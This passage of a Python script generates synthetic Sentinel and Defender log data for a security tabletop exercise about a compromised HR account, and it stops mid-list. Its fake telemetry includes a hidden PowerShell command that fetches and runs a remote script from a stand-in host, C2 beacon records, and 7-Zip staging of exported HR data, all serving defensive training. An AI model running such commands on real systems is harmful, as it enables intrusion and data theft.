"""Build deterministic Kusto CSV batches for the Storm-2077 tabletop.

Files are headerless because Kusto ingests them positionally. ``manifest.json``
contains the schema and release offset for every batch.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import json
import random
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SCHEMA_DIR = ROOT / "schema"
TENANT = "8cafe100-0000-4000-9000-000000000001"
DAY = datetime(2026, 11, 12, 10, 0, tzinfo=timezone.utc)
LOUISE = "louise.lonn@creditsafe.com"
DEVICE = "CS-LL-W11-042"
C2 = "209.141.46.83"
RNG = random.Random(2077)

ROLE_PROFILES = {
    "auditor": ["Compliance Reader"],
    "cloud_admin": ["Azure Contributor"],
    "grc": ["Compliance Reader"],
    "m365_admin": ["Exchange Administrator", "SharePoint Administrator"],
    "network_admin": ["Network Contributor"],
    "privileged_engineer": ["Intune Administrator"],
    "security_analyst": ["Security Reader", "Microsoft Sentinel Responder"],
    "grc_auditor": ["Compliance Reader", "eDiscovery Reviewer"],
    "service_desk": ["Authentication Administrator", "User Administrator"],
    "cloud_architect": ["Azure Reader"],
}

# Routine closed incidents mirror the background queue shown in the web app.
# Keeping them in Kusto prevents the five attack-related incidents from being
# the only historical records analysts can find through Logs.
HISTORICAL_NOISE = [
    ("INC-1703", "Malware detected and quarantined on one device", "Medium", "Execution", "beth.edgar@creditsafe.com", "Endpoint protection quarantined the file; full scan clean.", "2026-08-16T08:42:00Z"),
    ("INC-1711", "Unfamiliar sign-in properties", "Low", "Initial Access", "james.dryington@creditsafe.com", "Confirmed new corporate mobile and normal UK location.", "2026-08-18T12:16:00Z"),
    ("INC-1720", "Multiple failed sign-ins followed by success", "Medium", "Credential Access", "callum.foster@creditsafe.com", "User confirmed password typo after returning from leave.", "2026-08-21T09:38:00Z"),
    ("INC-1728", "Azure resource deletion activity", "Medium", "Impact", "david.woofer@creditsafe.com", "Approved decommission under platform change record.", "2026-08-24T15:27:00Z"),
    ("INC-1734", "Inbox rule created to move messages", "Low", "Persistence", "ruby.lawson@creditsafe.com", "Rule moves newsletter responses to a campaign folder.", "2026-08-26T10:51:00Z"),
    ("INC-1742", "High-volume SharePoint download", "Medium", "Collection", "alex.williams@creditsafe.com", "Approved evidence export for the quarterly audit.", "2026-08-29T14:05:00Z"),
    ("INC-1751", "Risky sign-in from anonymous IP address", "High", "Initial Access", "imogen.walsh@creditsafe.com", "Corporate travel VPN confirmed by user and manager.", "2026-09-01T17:32:00Z"),
    ("INC-1760", "User reported message as phishing", "Low", "Initial Access", "maya.fielding@creditsafe.com", "Bulk marketing message; sender and links validated.", "2026-09-03T11:19:00Z"),
    ("INC-1769", "PowerShell launched with encoded command", "High", "Execution", "CS-SRE-W11-018", "Signed inventory script deployed by endpoint management.", "2026-09-07T07:58:00Z"),
    ("INC-1777", "Sensitive information sent externally", "Medium", "Exfiltration", "procurement@creditsafe.com", "DLP blocked the message; no information left the tenant.", "2026-09-05T16:44:00Z"),
    ("INC-1785", "Guest user added to a Teams site", "Low", "Persistence", "ayeesha.ahmed@external.example", "Supplier access matched the approved onboarding request.", "2026-09-13T13:20:00Z"),
    ("INC-1794", "MFA rejected by user", "Medium", "Credential Access", "connor.hayes@creditsafe.com", "Stale prompt from the user's managed Outlook client.", "2026-09-16T09:12:00Z"),
    ("INC-1802", "Suspicious archive file created", "Medium", "Collection", "owen.sykes@creditsafe.com", "Campaign artwork package created in the approved project path.", "2026-09-19T12:47:00Z"),
    ("INC-1810", "Connection to newly registered domain", "Medium", "Command and Control", "CS-MKT-W11-033", "Destination belonged to a newly launched approved survey provider.", "2026-09-22T10:36:00Z"),
    ("INC-1818", "Account added to privileged cloud role", "High", "Privilege Escalation", "rhydian.greggs@creditsafe.com", "Time-bound AWS architecture work approved in change record.", "2026-09-25T15:03:00Z"),
    ("INC-1826", "Mass deletion in OneDrive", "Medium", "Impact", "aimee.flangan@creditsafe.com", "User reorganised a project folder; files recoverable in recycle bin.", "2026-09-29T08:29:00Z"),
    ("INC-1835", "Impossible travel - United States", "Medium", "Initial Access", "daniel.price@creditsafe.com", "Concurrent mobile and corporate VPN sessions caused inaccurate location data.", "2026-10-02T18:11:00Z"),
    ("INC-1940", "OAuth application granted mail permissions", "High", "Persistence", "tessa.monroe@creditsafe.com", "Approved marketing automation integration; publisher verified.", "2026-10-05T11:42:00Z"),
    ("INC-1949", "Executable downloaded from cloud storage", "Medium", "Execution", "CS-ENG-W11-071", "Approved developer utility; hash and publisher validated.", "2026-10-09T14:18:00Z"),
    ("INC-1957", "Outbound email volume anomaly", "Medium", "Exfiltration", "naomi.clarke@creditsafe.com", "Expected customer renewal campaign sent through Dynamics.", "2026-10-13T16:07:00Z"),
    ("INC-1965", "Administrative account password reset", "Low", "Credential Access", "adam.thomas@creditsafe.com", "Service Desk reset followed verified identity process.", "2026-10-18T09:54:00Z"),
    ("INC-1973", "Rare process communicating externally", "High", "Command and Control", "NET-ADM-012", "Network diagnostic binary and destination approved for testing.", "2026-10-23T13:31:00Z"),
    ("INC-1981", "Files copied to removable media", "Medium", "Exfiltration", "CS-HR-W11-028", "Copy blocked by device-control policy; no successful transfer.", "2026-10-28T10:22:00Z"),
    ("INC-1989", "New forwarding rule detected", "Medium", "Persistence", "freya.morgan@creditsafe.com", "Temporary cover arrangement approved by Sales management.", "2026-11-02T08:48:00Z"),
    ("INC-1997", "Cloud account created then removed", "Low", "Persistence", "emma.outgram@creditsafe.com", "Short-lived account used for approved migration validation.", "2026-11-08T15:39:00Z"),
]


def stamp(value):
    return value.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def load_schemas():
    schemas = {}
    for path in sorted(SCHEMA_DIR.glob("*.csv")):
        with path.open(encoding="utf-8-sig", newline="") as handle:
            rows = sorted(csv.DictReader(handle), key=lambda item: int(item["ColumnOrdinal"]))
        schemas[path.stem] = [{"name": item["ColumnName"], "type": item["ColumnType"]} for item in rows]
    return schemas


def record(schemas, table, **values):
    allowed = {column["name"] for column in schemas[table]}
    unknown = set(values) - allowed
    if unknown:
        raise ValueError(f"{table} has no columns: {sorted(unknown)}")
    base = {"TenantId": TENANT, "SourceSystem": "Tabletop", "Type": table}
    base.update(values)
    return {column["name"]: base.get(column["name"], "") for column in schemas[table]}


def add(rows, offset, table, item):
    rows[(offset, table)].append(item)


def build_rows(schemas):
    rows = defaultdict(list)
    historical = -1
    september = datetime(2026, 9, 3, 9, 8, tzinfo=timezone.utc)

    add(rows, historical, "IdentityInfo", record(schemas, "IdentityInfo", TimeGenerated=stamp(DAY-timedelta(days=1)), AccountName="louise.lonn", AccountDomain="creditsafe.com", AccountUPN=LOUISE, AccountDisplayName="Louise Lonn", Department="Human Resources", JobTitle="HR Analyst", AssignedRoles=json.dumps(["eDiscovery Manager", "Security Reader"]), GroupMembership=json.dumps(["Human Resources"]), IsAccountEnabled="true", UserType="Member", RiskLevel="high", IsMFARegistered="true"))
    add(rows, historical, "DeviceInfo", record(schemas, "DeviceInfo", TimeGenerated=stamp(DAY-timedelta(days=1)), Timestamp=stamp(DAY-timedelta(days=1)), DeviceId="dev-ll-042", DeviceName=DEVICE, OSPlatform="Windows11", OnboardingStatus="Onboarded", SensorHealthState="Active", IsAzureADJoined="true", MachineGroup="Corporate Workstations"))

    with (ROOT / "SCENARIO_ROSTER.csv").open(encoding="utf-8-sig", newline="") as handle:
        roster = list(csv.DictReader(handle))
    for index, user in enumerate(roster):
        upn=user["UserPrincipalName"]
        roles = ["eDiscovery Manager", "Security Reader"] if upn == LOUISE else ROLE_PROFILES.get(user["SimulationProfile"], [])
        if upn != LOUISE:
            add(rows,historical,"IdentityInfo",record(schemas,"IdentityInfo",TimeGenerated=stamp(DAY-timedelta(days=1)),AccountName=upn.split("@")[0],AccountDomain=upn.split("@")[-1],AccountUPN=upn,AccountDisplayName=user["DisplayName"],Department=user["Department"],JobTitle=user["JobTitle"],AssignedRoles=json.dumps(roles),GroupMembership=json.dumps([user["Department"]]),IsAccountEnabled="true",UserType=user["UserType"],RiskLevel="none",IsMFARegistered="true"))
        if user["UserType"] != "Member":
            continue
        device=DEVICE if upn == LOUISE else f"CS-{user['UserId']}-W11"
        device_id="dev-ll-042" if upn == LOUISE else f"dev-{user['UserId'].lower()}"
        if upn != LOUISE:
            add(rows,historical,"DeviceInfo",record(schemas,"DeviceInfo",TimeGenerated=stamp(DAY-timedelta(days=1)),Timestamp=stamp(DAY-timedelta(days=1)),DeviceId=device_id,DeviceName=device,OSPlatform="Windows11",OnboardingStatus="Onboarded",SensorHealthState="Active",IsAzureADJoined="true",MachineGroup="Corporate Workstations"))
        for event_number in range(24):
            days_ago=2+((index*7+event_number*11)%87); minute=(index*13+event_number*37)%540+480; when=DAY-timedelta(days=days_ago)+timedelta(minutes=minute)
            add(rows,historical,"SigninLogs",record(schemas,"SigninLogs",TimeGenerated=stamp(when),UserPrincipalName=upn,UserDisplayName=user["DisplayName"],AppDisplayName=("Microsoft Teams","Office 365 Exchange Online","Microsoft SharePoint Online")[event_number%3],IPAddress=f"10.{20+index%20}.{event_number%250}.{10+index%200}",ResultType="0",ResultDescription="Success",ClientAppUsed="Browser",DeviceDetail=json.dumps({"deviceId":device_id,"displayName":device,"isManaged":True}),Location="GB",LocationDetails=json.dumps({"city":("London","Cardiff","Bristol","Manchester")[index%4],"countryOrRegion":"GB"}),RiskLevelDuringSignIn="none"))
        for event_number in range(10):
            days_ago=1+((index*5+event_number*9)%88); when=DAY-timedelta(days=days_ago)+timedelta(hours=8+(event_number%9),minutes=index%55); filename=f"Project_{(index+event_number)%40:02}_Document_{event_number:02}.docx"
            add(rows,historical,"CloudAppEvents",record(schemas,"CloudAppEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),AccountId=upn,AccountDisplayName=user["DisplayName"],Application="Microsoft SharePoint Online",ActionType=("FileAccessed","FilePreviewed","FileDownloaded")[event_number%3],ObjectName=filename,ObjectType="File",IPAddress=f"10.{20+index%20}.4.{10+index%200}",CountryCode="GB",IsExternalUser="false",OSPlatform="Windows 11",DeviceType="Desktop"))
        for event_number in range(3):
            days_ago=3+((index*3+event_number*17)%84); when=DAY-timedelta(days=days_ago)+timedelta(hours=9+event_number)
            recipient=roster[(index+event_number+1)%len(roster)]["UserPrincipalName"]
            add(rows,historical,"EmailEvents",record(schemas,"EmailEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),NetworkMessageId=f"normal-{index:03}-{event_number}",SenderFromAddress=upn,SenderFromDomain="creditsafe.com",RecipientEmailAddress=recipient,Subject=("Project update","Meeting notes","Monthly report")[event_number],DeliveryAction="Delivered",DeliveryLocation="Inbox",EmailDirection="Intra-org",ThreatTypes="",UrlCount="0"))
        # Endpoint background activity prevents a single user or device from
        # dominating a hunting table. The formulae are deterministic so
        # facilitator validation queries remain repeatable between rebuilds.
        common_destinations = (
            ("teams.microsoft.com", "198.51.100.20", "ms-teams.exe"),
            ("outlook.office.com", "198.51.100.21", "outlook.exe"),
            ("login.microsoftonline.com", "198.51.100.22", "msedge.exe"),
            ("creditsafe.sharepoint.com", "198.51.100.23", "onedrive.exe"),
            ("settings-win.data.microsoft.com", "198.51.100.24", "svchost.exe"),
            ("browser.events.data.microsoft.com", "198.51.100.25", "msedge.exe"),
        )
        for event_number in range(16):
            days_ago=1+((index*11+event_number*5)%89)
            when=DAY-timedelta(days=days_ago)+timedelta(hours=7+(event_number%11),minutes=(index*7+event_number*13)%60)
            remote_url,remote_ip,process=common_destinations[(index+event_number)%len(common_destinations)]
            add(rows,historical,"DeviceNetworkEvents",record(schemas,"DeviceNetworkEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),DeviceId=device_id,DeviceName=device,ActionType="ConnectionSuccess",LocalIP=f"10.{20+index%20}.4.{10+index%200}",LocalIPType="Private",LocalPort=49152+((index*31+event_number*17)%12000),RemoteIP=remote_ip,RemoteIPType="Public",RemotePort=443,RemoteUrl=remote_url,Protocol="Tcp",InitiatingProcessFileName=process,InitiatingProcessAccountUpn=upn,MachineGroup="Corporate Workstations"))
        common_processes = (
            ("msedge.exe", "msedge.exe --no-startup-window", "explorer.exe"),
            ("outlook.exe", "outlook.exe /recycle", "explorer.exe"),
            ("ms-teams.exe", "ms-teams.exe --process-start-args", "explorer.exe"),
            ("onedrive.exe", "OneDrive.exe /background", "explorer.exe"),
            ("backgroundTaskHost.exe", "backgroundTaskHost.exe -ServerName:App.AppX", "svchost.exe"),
        )
        for event_number,(filename,command,parent) in enumerate(common_processes):
            days_ago=2+((index*13+event_number*19)%87)
            when=DAY-timedelta(days=days_ago)+timedelta(hours=8+event_number*2,minutes=(index*3+event_number*11)%60)
            add(rows,historical,"DeviceProcessEvents",record(schemas,"DeviceProcessEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),DeviceId=device_id,DeviceName=device,AccountUpn=upn,ActionType="ProcessCreated",FileName=filename,FolderPath="C:\\Program Files\\Microsoft",ProcessCommandLine=command,InitiatingProcessFileName=parent,InitiatingProcessAccountUpn=upn,MachineGroup="Corporate Workstations"))
        for event_number in range(4):
            days_ago=4+((index*17+event_number*23)%84)
            when=DAY-timedelta(days=days_ago)+timedelta(hours=9+event_number,minutes=(index*5+event_number*7)%60)
            extension=("docx","xlsx","pdf","pptx")[event_number]
            add(rows,historical,"DeviceFileEvents",record(schemas,"DeviceFileEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),DeviceId=device_id,DeviceName=device,ActionType="FileCreated",FileName=f"Working_Document_{(index+event_number)%50:02}.{extension}",FolderPath=f"C:\\Users\\{upn.split('@')[0]}\\OneDrive - Creditsafe\\Documents",InitiatingProcessAccountUpn=upn,InitiatingProcessFileName=("winword.exe","excel.exe","msedge.exe","powerpnt.exe")[event_number],MachineGroup="Corporate Workstations"))

    message_id = "msg-hr-clickfix-0903"
    add(rows, historical, "EmailEvents", record(schemas, "EmailEvents", TimeGenerated=stamp(september), Timestamp=stamp(september), NetworkMessageId=message_id, SenderFromAddress="benefits@hr-document.example", SenderFromDomain="hr-document.example", RecipientEmailAddress=LOUISE, Subject="Updated employee benefits document", DeliveryAction="Delivered", DeliveryLocation="Inbox", EmailDirection="Inbound", ThreatTypes="Phish", UrlCount="1"))
    add(rows, historical, "EmailEvents", record(schemas, "EmailEvents", TimeGenerated=stamp(september), Timestamp=stamp(september), NetworkMessageId=message_id+"-shared", SenderFromAddress="benefits@hr-document.example", RecipientEmailAddress="hr@creditsafe.com", Subject="Updated employee benefits document", DeliveryAction="Delivered", DeliveryLocation="Inbox", EmailDirection="Inbound", ThreatTypes="Phish", UrlCount="1"))
    add(rows, historical, "UrlClickEvents", record(schemas, "UrlClickEvents", Timestamp=stamp(september+timedelta(minutes=2)), TimeGenerated=stamp(september+timedelta(minutes=2)), Url="https://microsoft-document.example/verify", ActionType="ClickAllowed", AccountUpn=LOUISE, Workload="Email", NetworkMessageId=message_id, IPAddress="10.42.18.73", IsClickedThrough="true"))
    add(rows, historical, "SigninLogs", record(schemas, "SigninLogs", TimeGenerated=stamp(september+timedelta(minutes=3)), UserPrincipalName=LOUISE, UserDisplayName="Louise Lonn", AppDisplayName="Office 365 Exchange Online", IPAddress="192.0.2.85", ResultType="0", ResultDescription="Success", ClientAppUsed="Browser", DeviceDetail=json.dumps({"deviceId":"","isManaged":False}), SessionId="sess-clickfix-0903", Location="GB", RiskLevelDuringSignIn="medium"))
    add(rows, historical, "DeviceProcessEvents", record(schemas, "DeviceProcessEvents", TimeGenerated=stamp(september+timedelta(minutes=4)), Timestamp=stamp(september+timedelta(minutes=4)), DeviceId="dev-ll-042", DeviceName=DEVICE, AccountUpn=LOUISE, ActionType="ProcessCreated", FileName="powershell.exe", FolderPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0", ProcessCommandLine="powershell -w hidden -c iwr https://cdn-update.example/a.ps1 | iex", InitiatingProcessFileName="msedge.exe", InitiatingProcessAccountUpn=LOUISE))
    add(rows, historical, "DeviceProcessEvents", record(schemas, "DeviceProcessEvents", TimeGenerated=stamp(september+timedelta(minutes=5)), Timestamp=stamp(september+timedelta(minutes=5)), DeviceId="dev-ll-042", DeviceName=DEVICE, AccountUpn=LOUISE, ActionType="ProcessCreated", FileName="svchost-update.exe", FolderPath="C:\\Users\\Louise.Lonn\\AppData\\Roaming\\Microsoft", ProcessCommandLine="svchost-update.exe -silent", InitiatingProcessFileName="powershell.exe", SHA256=hashlib.sha256(b"sparkrat-tabletop").hexdigest()))
    for day in range(0, 70, 3):
        when = september + timedelta(days=day, minutes=6)
        add(rows, historical, "DeviceNetworkEvents", record(schemas, "DeviceNetworkEvents", TimeGenerated=stamp(when), Timestamp=stamp(when), DeviceId="dev-ll-042", DeviceName=DEVICE, ActionType="ConnectionSuccess", RemoteIP=C2, RemotePort="443", RemoteUrl="aeifile.offiec.us.kg", Protocol="Tcp", InitiatingProcessFileName="svchost-update.exe", InitiatingProcessAccountUpn=LOUISE))
    add(rows, historical, "ThreatIntelligenceIndicator", record(schemas, "ThreatIntelligenceIndicator", TimeGenerated=stamp(DAY-timedelta(days=20)), Action="Alert", Active="true", ConfidenceScore="85", Description="Historical TAG-100 command-and-control infrastructure; Microsoft maps TAG-100 to Storm-2077", ExternalIndicatorId="TI-TAG100-2091414683", ThreatType="Command and control", ThreatSeverity="High", NetworkIP=C2, IndicatorProvider="Recorded Future", Tags=json.dumps(["TAG-100", "Storm-2077"])))

    audit_events = [
        (19, "Reset user password", LOUISE, "Anita Job", "Success"),
        (3*24*60+117, "Invite external user", "hradvisor@rnicrosoft.com", LOUISE, "Success"),
        (16*24*60+272, "Add member to role", LOUISE, "eDiscovery Manager", "Success"),
        (16*24*60+273, "Add member to role", LOUISE, "Security Reader", "Success"),
    ]
    for minutes, operation, target, actor, result in audit_events:
        when=september+timedelta(minutes=minutes)
        add(rows, historical, "AuditLogs", record(schemas, "AuditLogs", TimeGenerated=stamp(when), OperationName=operation, ActivityDisplayName=operation, Result=result, Identity=actor, InitiatedBy=json.dumps({"user":{"userPrincipalName":actor}}), TargetResources=json.dumps([{"displayName":target}]), Category="UserManagement"))

    for group, count in enumerate([50,49,49,49,49]):
        start=datetime(2026,9,28,10,0,tzinfo=timezone.utc)+timedelta(days=group*6)
        for number in range(1,count+1):
            when=start+timedelta(seconds=50*number)
            filename=f"Personal_{group+1}_{number:02}.docx"
            add(rows,historical,"CloudAppEvents",record(schemas,"CloudAppEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),AccountId=LOUISE,AccountDisplayName="Louise Lonn",Application="Microsoft OneDrive for Business",ActionType="FileDownloaded",ObjectName=filename,ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN"))
            add(rows,historical,"OfficeActivity",record(schemas,"OfficeActivity",TimeGenerated=stamp(when),Operation="FileDownloaded",Activity="FileDownloaded",UserId=LOUISE,OfficeWorkload="SharePoint",ClientIP="203.0.113.44",SourceFileName=filename,ResultStatus="Succeeded"))

    for attempt in range(9):
        when=datetime(2026,9,1,8,0,tzinfo=timezone.utc)+timedelta(days=attempt*8)
        add(rows,historical,"CiscoASA_CL",record(schemas,"CiscoASA_CL",TimeGenerated=stamp(when),DeviceName="CS-EDGE-ASA-01",DeviceVendor="Cisco",DeviceProduct="ASA",DeviceVersion="9.18(4)",EventType="Intrusion",EventSubType="ExploitAttempt",Severity="High",Action="Blocked",Result="Failure",Direction="Inbound",Protocol="TCP",SourceIP=C2,DestinationIP="198.51.100.10",DestinationPort="443",SignatureId="CVE-2020-3452",ThreatName="Path traversal attempt",BytesSent="312",BytesReceived="0"))

    historical_incidents = [
        ("INC-1841", "Phishing link reported by Louise Lonn", september+timedelta(minutes=26), "Medium", "Initial Access", LOUISE, "Password reset completed. User confirmed the message was reported.", "Anita Job", "BenignPositive", "SuspiciousButExpected"),
        ("INC-1854", "Impossible travel - Birmingham", datetime(2026,9,4,14,46,tzinfo=timezone.utc), "Medium", "Initial Access", LOUISE, "ExpressVPN activity considered expected.", "Anita Job", "BenignPositive", "SuspiciousButExpected"),
        ("INC-1868", "Guest account invited to tenant", datetime(2026,9,6,11,31,tzinfo=timezone.utc), "Medium", "Persistence", LOUISE, "Microsoft adviser account; no further action required.", "Anita Job", "BenignPositive", "SuspiciousButExpected"),
        ("INC-1889", "Impossible travel - China", datetime(2026,9,11,2,42,tzinfo=timezone.utc), "High", "Initial Access", LOUISE, "ExpressVPN use explains location.", "Anita Job", "BenignPositive", "SuspiciousButExpected"),
        ("INC-1932", "Louise Lonn downloaded 50 personal files", datetime(2026,9,28,11,6,tzinfo=timezone.utc), "High", "Collection", LOUISE, "Filenames appear personal. Closed as user activity.", "Anita Job", "BenignPositive", "SuspiciousButExpected"),
    ]
    owners = ("Hannah Rees", "Anita Job", "Marcus Vale", "Priya Shah")
    for index, (incident_id,title,severity,tactics,entity,comment,closed_at) in enumerate(HISTORICAL_NOISE):
        classification = "FalsePositive" if incident_id == "INC-1835" else "BenignPositive"
        reason = "InaccurateData" if incident_id == "INC-1835" else "SuspiciousButExpected"
        historical_incidents.append((incident_id,title,datetime.fromisoformat(closed_at.replace("Z", "+00:00")),severity,tactics,entity,comment,owners[index % len(owners)],classification,reason))

    for incident_id,title,closed,severity,tactics,entity,comment,owner,classification,reason in historical_incidents:
        alert_id=f"ALT-{incident_id[4:]}"
        add(rows,historical,"SecurityAlert",record(schemas,"SecurityAlert",TimeGenerated=stamp(closed-timedelta(minutes=20)),DisplayName=title,AlertName=title,AlertSeverity=severity,Description="Historical detection reviewed by SecOps.",ProviderName="Microsoft Defender XDR",VendorName="Microsoft",SystemAlertId=alert_id,IsIncident="true",StartTime=stamp(closed-timedelta(minutes=25)),EndTime=stamp(closed-timedelta(minutes=20)),Status="Resolved",CompromisedEntity=entity,Tactics=tactics))
        add(rows,historical,"SecurityIncident",record(schemas,"SecurityIncident",TimeGenerated=stamp(closed),IncidentName=incident_id,Title=title,Description="Historical incident retained for retrospective investigation.",Severity=severity,Status="Closed",Classification=classification,ClassificationReason=reason,ClassificationComment=comment,Owner=json.dumps({"assignedTo":owner}),ProviderName="Microsoft Sentinel",ProviderIncidentId=incident_id,CreatedTime=stamp(closed-timedelta(minutes=30)),ClosedTime=stamp(closed),IncidentNumber=incident_id[4:],AlertIds=json.dumps([alert_id]),ModifiedBy=owner))

    alert_catalog = [
        (5,"INC-2001","Admin user deleted an MFA phone from a user's account","Medium","Credential Access"),(10,"INC-2002","Email messages containing malicious URL deleted after delivery","Medium","Initial Access"),(20,"INC-2003","MFA rejected by user","Medium","Credential Access"),(30,"INC-2004","Rare and potentially high-risk Office operations","High","Persistence, Collection"),(40,"INC-2005","Azure VM Run Command executing a unique PowerShell script","Medium","Execution"),(50,"INC-2006","Outbound email exceeds 400","Medium","Exfiltration"),(57,"INC-2007","Files copied to USB - blocked by policy","Low","Exfiltration"),(65,"INC-2008","Guest users invited to tenant by new inviters","Medium","Persistence"),(85,"INC-2009","Louise Lonn downloaded 50 files","High","Collection"),(100,"INC-2010","Archive created in a suspicious temporary location","High","Collection, Exfiltration"),(110,"INC-2011","Account created and deleted in a short timeframe","Medium","Persistence"),(120,"INC-2012","Sensitive file upload to external Teams user blocked","Medium","Exfiltration"),(135,"INC-2013","User added to Intune_Local_Admins Entra ID group","High","Privilege Escalation"),(150,"INC-2014","External guest downloaded sensitive archives","High","Collection, Exfiltration"),(170,"INC-2015","Connection to a custom network indicator","Medium","Command and Control"),(190,"INC-2016","Registry-based persistence references SparkRAT","High","Persistence"),
    ]
    for minute,incident_id,title,severity,tactics in alert_catalog:
        when=DAY+timedelta(minutes=minute); alert_id=f"ALT-{incident_id[4:]}"
        add(rows,minute*60,"SecurityAlert",record(schemas,"SecurityAlert",TimeGenerated=stamp(when),DisplayName=title,AlertName=title,AlertSeverity=severity,Description="Review the related entities and source telemetry.",ProviderName="Microsoft Defender XDR",VendorName="Microsoft",SystemAlertId=alert_id,IsIncident="true",StartTime=stamp(when-timedelta(minutes=5)),EndTime=stamp(when),Status="New",Tactics=tactics))
        add(rows,minute*60,"SecurityIncident",record(schemas,"SecurityIncident",TimeGenerated=stamp(when),IncidentName=incident_id,Title=title,Description="Automatically created from the scheduled analytic alert.",Severity=severity,Status="New",Owner=json.dumps({"assignedTo":None}),ProviderName="Microsoft Sentinel",ProviderIncidentId=incident_id,CreatedTime=stamp(when),IncidentNumber=incident_id[4:],AlertIds=json.dumps([alert_id])))
        add(rows,minute*60,"AlertEvidence",record(schemas,"AlertEvidence",TimeGenerated=stamp(when),Timestamp=stamp(when),AlertId=alert_id,Title=title,Categories=tactics,ServiceSource="Microsoft Sentinel",DetectionSource="Scheduled analytics",EntityType="Account",EvidenceRole="Impacted",AccountUpn=LOUISE if incident_id in {"INC-2004","INC-2009","INC-2010","INC-2014","INC-2016"} else "",Severity=severity))

    day_events = [
        (1,"AuditLogs",dict(OperationName="Delete user authentication phone method",ActivityDisplayName="Delete user authentication phone method",Identity="adam.thomas@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"Victoria Nash"}]))),
        (8,"EmailEvents",dict(NetworkMessageId="rh-campaign-001",SenderFromAddress="offers@campaign-example.test",SenderFromDomain="campaign-example.test",RecipientEmailAddress="ruby.lawson@creditsafe.com",Subject="Urgent campaign document",DeliveryAction="Blocked",DeliveryLocation="Quarantine",LatestDeliveryAction="ZAP",ThreatTypes="Phish",UrlCount="1")),
        (16,"SigninLogs",dict(UserPrincipalName="molly.ups@creditsafe.com",UserDisplayName="Molly Ups",AppDisplayName="Microsoft Office",IPAddress="10.24.8.31",ResultType="500121",ResultDescription="Authentication failed because the user declined the MFA request",ClientAppUsed="Mobile Apps and Desktop clients",DeviceDetail=json.dumps({"displayName":"Molly managed iPhone","isManaged":True}),Location="GB",RiskLevelDuringSignIn="low")),
        (25,"OfficeActivity",dict(Operation="New-InboxRule",Activity="New-InboxRule",UserId=LOUISE,OfficeWorkload="Exchange",ClientIP="203.0.113.44",Parameters=json.dumps({"Name":"Personal","ForwardTo":"craiglonn@gmail.com"}),ResultStatus="Succeeded")),
        (34,"AzureActivity",dict(OperationName="Run Command on Virtual Machine",OperationNameValue="Microsoft.Compute/virtualMachines/runCommand/action",ActivityStatus="Succeeded",ActivityStatusValue="Success",ResourceGroup="production-monitoring-rg",Caller="david.woofer@creditsafe.com",CallerIpAddress="10.22.14.8",Category="Administrative",CategoryValue="Administrative",Resource="az-monitor-17")),
        (35,"OfficeActivity",dict(Operation="SearchQueryInitiatedExchange",Activity="Search",UserId=LOUISE,OfficeWorkload="Exchange",ClientIP="203.0.113.44",Parameters=json.dumps({"Query":"payroll salary redundancy disciplinary PII"}),ResultStatus="Succeeded")),
        (45,"OfficeActivity",dict(Operation="SearchStarted",Activity="eDiscoverySearch",UserId=LOUISE,OfficeWorkload="SecurityComplianceCenter",ClientIP="203.0.113.44",Parameters=json.dumps({"Case":"HR-Confidential","Query":"payroll OR salary OR redundancy"}),ResultStatus="Succeeded")),
        (52,"CloudAppEvents",dict(AccountId="aimee.flangan@creditsafe.com",AccountDisplayName="Aimee Flangan",Application="Microsoft Defender for Endpoint",ActionType="FileCopiedToRemovableMediaBlocked",ObjectName="Project_Delivery_Pack.zip",ObjectType="File",IPAddress="10.25.7.19",AdditionalFields=json.dumps({"device":"CS-PMO-W11-014","usbSerial":"CS-USB-0042","result":"Blocked"}))),
        (58,"AuditLogs",dict(OperationName="Invite external user",ActivityDisplayName="Invite external user",Identity="beth.edgar@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"Ayeesha Ahmed","userPrincipalName":"ayeesha.ahmed@external.example"}]))),
        (90,"DeviceFileEvents",dict(ActionType="FileCreated",DeviceId="dev-ll-042",DeviceName=DEVICE,FileName="eDiscoveryExport001.pst",FolderPath="C:\\Users\\Louise.Lonn\\AppData\\Local\\Temp",InitiatingProcessAccountUpn=LOUISE,InitiatingProcessFileName="msedge.exe",SensitivityLabel="Highly Confidential")),
        (95,"DeviceProcessEvents",dict(DeviceId="dev-ll-042",DeviceName=DEVICE,AccountUpn=LOUISE,ActionType="ProcessCreated",FileName="7z.exe",ProcessCommandLine='7z a "%TEMP%\\hr_personal.7z" "%TEMP%\\eDiscoveryExport*"',InitiatingProcessFileName="svchost-update.exe")),
        (104,"AuditLogs",dict(OperationName="Delete user",ActivityDisplayName="Delete user",Identity="emma.outgram@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"M365-MIG-VALIDATE-07"}]),ResultReason="Approved migration validation change")),
        (114,"CloudAppEvents",dict(AccountId="hannah.rees@creditsafe.com",AccountDisplayName="Hannah Rees",Application="Microsoft Teams",ActionType="FileUploadBlocked",ObjectName="External_PenTest_Findings_Sanitised.pdf",ObjectType="File",IsExternalUser="false",AdditionalFields=json.dumps({"recipient":"Tom Blackburn","result":"Blocked","policy":"External sharing DLP"}))),
        (125,"CloudAppEvents",dict(AccountId=LOUISE,AccountDisplayName="Louise Lonn",Application="Microsoft SharePoint Online",ActionType="FileUploaded",ObjectName="hr_personal.7z",ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN",IsExternalUser="false")),
        (129,"AuditLogs",dict(OperationName="Add member to group",ActivityDisplayName="Add member to group",Identity="barry.thendrews@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"Bill Cottray"},{"displayName":"Intune_Local_Admins"}]))),
        (135,"OfficeActivity",dict(Operation="SharingSet",Activity="SharingSet",UserId=LOUISE,OfficeWorkload="SharePoint",ClientIP="203.0.113.44",SourceFileName="hr_personal.7z",UserSharedWith="hradvisor@rnicrosoft.com",SharingType="ExternalUserSharingOnly",ResultStatus="Succeeded",ExternalAccess="true")),
